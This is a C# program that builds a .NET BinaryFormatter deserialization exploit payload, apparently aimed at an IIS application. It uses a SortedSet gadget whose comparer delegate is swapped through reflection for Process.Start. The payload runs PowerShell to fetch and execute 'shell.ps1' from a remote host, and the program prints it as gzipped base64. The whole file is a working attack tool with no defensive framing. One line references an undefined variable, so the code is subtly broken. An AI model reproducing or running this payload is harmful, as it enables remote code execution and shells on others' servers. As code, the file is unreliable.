using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;

namespace hawktraceiis
{
    class Program
    {
        static void Main(string[] args)
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            csharpset.Add("powershell.exe");
            set.Add("-Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.102:8081/shell.ps1')\"");

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            using (MemoryStream stream = new MemoryStream())
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(stream, set);
                using (MemoryStream compst = new MemoryStream())
                {
                    using (GZipStream gzipStream = new GZipStream(compst, CompressionMode.Compress))
                    {
                        stream.Position = 0;
                        stream.CopyTo(gzipStream);
                    }
                    string gzb4 = Convert.ToBase64String(compst.ToArray());
                    Console.WriteLine(gzb4);
                }
            }
        }
    }

}

